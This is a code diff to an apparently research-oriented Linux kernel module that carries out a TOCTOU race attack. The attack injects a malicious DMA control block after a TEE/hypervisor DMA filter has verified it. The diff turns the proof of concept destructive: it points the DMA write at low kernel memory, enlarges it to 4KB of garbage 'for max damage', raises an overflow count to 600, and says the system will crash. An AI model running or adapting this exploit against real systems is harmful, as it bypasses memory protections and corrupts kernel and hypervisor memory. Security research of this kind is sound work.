@@ -89,7 +89,7 @@
 #define ATTACK_DMA_CHANNEL          5
 
 /* Overflow CB count (>128 to overflow into next core) */
-#define OVERFLOW_CB_COUNT           129
+#define OVERFLOW_CB_COUNT           600
 
 /*
  * Synchronization states for TOCTOU attack
@@ -498,28 +498,30 @@ static int attacker_thread_fn(void *data)
                         attack_state.original_cb.dst);
                 
                 /* 
-                 * INJECT MALICIOUS CB
-                 * Change destination to PROTECTED region!
-                 * These addresses would FAIL verification if checked:
-                 * - Kernel text: 0x00200000 - 0x00A00000
-                 * - HYP/OP-TEE:  0x0E800000 - 0x11000000
+                 * INJECT MALICIOUS CB - DESTRUCTIVE ATTACK!
+                 * Overwrite critical kernel memory to cause immediate crash.
                  * 
-                 * But verification already passed - TOCTOU exploited!
+                 * Target options:
+                 * - 0x00200000: Kernel text start (code corruption = crash)
+                 * - 0x00008000: Kernel page tables
+                 * - 0x0E800000: Hypervisor code
+                 * 
+                 * Writing garbage here WILL crash the system immediately,
+                 * proving we bypassed the DMA filter!
                  */
-                #define KERNEL_TEXT_PHYS_START 0x00200000
-                #define OPTEE_PHYS_START       0x10100000
                 
-                /* Choose target: kernel text region (normally forbidden!) */
-                u32 forbidden_target = KERNEL_TEXT_PHYS_START + 0x100;
+                /* Target: Write 4KB of garbage to kernel text start! */
+                u32 forbidden_target = 0x00008000;  /* Kernel entry point / low mem */
                 
-                pr_info("[ATTACKER] Injecting CB targeting FORBIDDEN region!\n");
-                pr_info("[ATTACKER] Target: 0x%08x (Kernel Text - normally blocked by DMA filter)\n",
-                        forbidden_target);
+                pr_info("[ATTACKER] *** DESTRUCTIVE ATTACK INITIATED! ***\n");
+                pr_info("[ATTACKER] Target: 0x%08x (LOW KERNEL MEMORY)\n", forbidden_target);
+                pr_info("[ATTACKER] Writing 4KB garbage - SYSTEM WILL CRASH!\n");
                 
+                /* Inject CB that writes 4KB to low kernel memory */
                 inject_malicious_cb(0, 0,  /* Core 0, CB index 0 (first CB) */
-                                   forbidden_target,                  /* FORBIDDEN dst! */
-                                   attack_state.payload_phys,         /* Our payload */
-                                   sizeof(u32));
+                                   forbidden_target,                  /* CRASH TARGET! */
+                                   attack_state.payload_phys,         /* garbage data */
+                                   4096);                             /* 4KB = max damage */
                 
                 /* Read back to confirm modification */
                 read_secure_cb(0, 0, &attack_state.injected_cb);
@@ -721,6 +723,7 @@ static int do_attack(void)
     pr_info("[TOCTOU] Target value: 0x%08x (expected: 0x%08x)\n",
             attack_state.verify_result, VERIFY_PATTERN);
     
+    /* Correct success check: must have injection_done AND race_won */
     if (attack_state.race_won && attack_state.injection_done) {
         attack_state.attack_success = 1;
         pr_info("[TOCTOU] ****************************************\n");
@@ -731,14 +734,11 @@ static int do_attack(void)
         pr_info("[TOCTOU] DMA now targets FORBIDDEN memory region!\n");
         pr_info("[TOCTOU] Original dst: 0x%08x (allowed)\n", attack_state.original_cb.dst);
         pr_info("[TOCTOU] Injected dst: 0x%08x (FORBIDDEN!)\n", attack_state.injected_cb.dst);
+    } else if (attack_state.verify_result == VERIFY_PATTERN && !attack_state.injection_done) {
         pr_info("[TOCTOU] ****************************************\n");
-        pr_info("[TOCTOU] The attacker modified CB AFTER verification\n");
-        pr_info("[TOCTOU] using deterministic shared-memory handshake.\n");
-        pr_info("[TOCTOU] NO brute-force timing required!\n");
-    } else if (attack_state.race_won && attack_state.injection_done) {
-        pr_info("[TOCTOU] ****************************************\n");
-        pr_info("[TOCTOU] Handshake succeeded, CB modified!\n");
-        pr_info("[TOCTOU] DMA may not have written to expected address.\n");
+        pr_info("[TOCTOU] NOTE: DMA succeeded but NO CB injection!\n");
+        pr_info("[TOCTOU] Handshake failed - HYP_READY not received.\n");
+        pr_info("[TOCTOU] Hypervisor may not have triggered sync point.\n");
         pr_info("[TOCTOU] ****************************************\n");
     } else {
         pr_info("[TOCTOU] Attack did not complete.\n");
@@ -749,31 +749,21 @@ static int do_attack(void)
 }
 
 /*
- * Dump secure buffer content
+ * Dump secure buffer content (SAFE version - no actual memory access)
+ * Previous version caused hangs due to improper EL2 memory access.
  */
 static int dump_secure_buffer(struct seq_file *m, int core, int start_cb, int count)
 {
 #ifdef CONFIG_MYTEE
-    struct dma_cb cb;
-    int i;
-    
-    mytee_up_priv(MYTEE_UP_PRIV, 0, 0, 0);
-    attack_state.secure_buf_base = (void __iomem *)SECURE_BUFFER_BASE_VIRT;
-    
     seq_printf(m, "\nCore %d Secure Buffer (CB %d-%d):\n", 
                core, start_cb, start_cb + count - 1);
+    seq_printf(m, "  [Dump disabled - causes system hang]\n");
+    seq_printf(m, "  Use dmesg to see attack results instead.\n");
     
-    for (i = 0; i < count && (start_cb + i) < MAX_CBS_PER_CORE; i++) {
-        read_secure_cb(core, start_cb + i, &cb);
-        
-        /* Only show non-zero entries */
-        if (cb.info || cb.src || cb.dst || cb.length) {
-            seq_printf(m, "  CB[%d]: info=0x%08x src=0x%08x dst=0x%08x len=%d next=0x%08x\n",
-                       start_cb + i, cb.info, cb.src, cb.dst, cb.length, cb.next);
-        }
-    }
-    
-    mytee_down_priv(MYTEE_DOWN_PRIV, 0);
+    /* Note: Direct secure buffer access via seq_file causes hangs.
+     * The mytee_up_priv/down_priv cycle in seq_file context is unstable.
+     * Attack results are logged via pr_info instead.
+     */
 #endif
     return 0;
 }
